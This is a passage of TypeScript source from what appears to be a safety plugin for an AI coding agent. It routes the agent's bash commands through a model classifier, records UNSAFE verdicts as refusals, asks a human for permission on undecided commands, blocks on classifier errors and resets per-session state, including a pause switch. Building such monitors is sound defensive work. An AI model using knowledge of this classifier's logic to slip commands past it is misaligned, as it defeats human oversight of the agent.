				why: `${detail}: ${judgement.reason}`,
				cmd: judgedCommand,
				cwd,
				verdict,
				cached: cached ? 1 : 0,
				ms: Date.now() - started,
				...(judgement.modelId ? { modelId: judgement.modelId } : {}),
				...(judgement.reasonCode ? { reasonCode: judgement.reasonCode } : {}),
				...(judgement.jev ? { jev: judgement.jev } : {}),
				...auditFields(),
				...judgementAudit(judgement),
			});
			// A refusal record (issue #30) needs a verdict that judged the
			// content, and with Jev that means UNSAFE outright: UNSURE is
			// undecided, and UNAVAILABLE judged nothing at all (a transport
			// failure is not evidence about the command). Only a human denial
			// makes an undecided command a refusal — requestPermission records
			// that itself.
			if (judgement.verdict === "UNSAFE" && judgement.persistRefusal !== false) {
				addRefusal(ctx, judgedCommand, judgement.reason, { source: "model", cwd, evidenceFingerprint: reviewEvidenceFingerprint });
			}
			// The dialog is offered the still-running judgment, with the guards a
			// late SAFE would still have to clear (see GuardedLateJudgement): the
			// same `prior` and overlay the SAFE branch above judges with.
			return await requestPermission(
				ctx,
				target,
				detail,
				judgement.reason,
				"bash",
				"follows verdict",
				userScopeFingerprint,
				{ ...auditFields(), ...judgementAudit(judgement) },
				judgement.late === undefined
					? undefined
					: { handle: judgement.late, priorRefusal: prior, riskFlags: matchModerateRiskTokens(judgedCommand, cwd) },
			);
		} catch (err) {
			// Unexpected plugin error: fail closed rather than wave the command
			// through on a path we cannot vouch for.
			pi.logger.error(`classifier: ${err instanceof Error ? err.message : String(err)}`);
			logDecisionFor(ctx, { tool: "bash", decision: "block", layer: "internal-error", why: "classifier failed; command not run", cmd: command, cwd: ctx.cwd, verdict: null, cached: 0, ms: Date.now() - started, ...auditFields() });
			return {
				block: true,
				reason: refusalPayload(
					"bash",
					"internal-error",
					"classifier failed; command not run",
					"Retry the command; if it keeps failing, check the plugin's error line in the OMP log.",
					"Do not treat the command as reviewed or approved.",
				),
			};
		}
	};
	pi.on("tool_call", handleToolCall);

	// Session boundaries: delete only this runner's entries. The extension module
	// is shared across concurrent sessions; clearing the whole cache on one
	// subagent's start/shutdown invalidates another session's cached verdicts.
	const dropCurrent = (_event: unknown, ctx: ExtensionContext) => {
		const sessionId = ctx.sessionManager.getSessionId();
		cache.delete(sessionId);
		refusals.delete(sessionId);
		grants.delete(sessionId);
		// A session-scoped pause dies at boundaries too: a resumed session
		// starts unpaused.
		sessionOff.delete(sessionId);
		floorTaint.delete(sessionId);
	};
	pi.on("session_start", dropCurrent);
	pi.on("session_before_switch", dropCurrent);
	pi.on("session_switch", dropCurrent);

	// One handler per event: shutdown drops the verdict cache, the refusal
	// memory, AND the warned flag. The warned flag deliberately does NOT follow
	// the cache across the other boundaries — `session_before_switch` carries
	// the OUTGOING session,
	// so clearing it there re-arms the toast every time the user switches away
	// and back, which is not "once per session".
	//
	// Be accurate about what the shutdown handler buys: the host emits
	// session_shutdown from AgentSession#doDispose, which is process exit, and
	// newSession() never disposes. So this delete reclaims nothing mid-process.
	// What actually makes a new session warn again is that a new session mints a
	// new id. The set grows one small entry per warned session for the life of
	// the process, which is bounded by how many sessions one process opens.
	pi.on("session_shutdown", (_event: unknown, ctx: ExtensionContext) => {
		const sessionId = ctx.sessionManager.getSessionId();
		cache.delete(sessionId);
		staleDisableWarned.delete(sessionId);
		refusals.delete(sessionId);
		grants.delete(sessionId);
		// Same boundary rule for the session-scoped pause.
		sessionOff.delete(sessionId);
		floorTaint.delete(sessionId);
	});
}
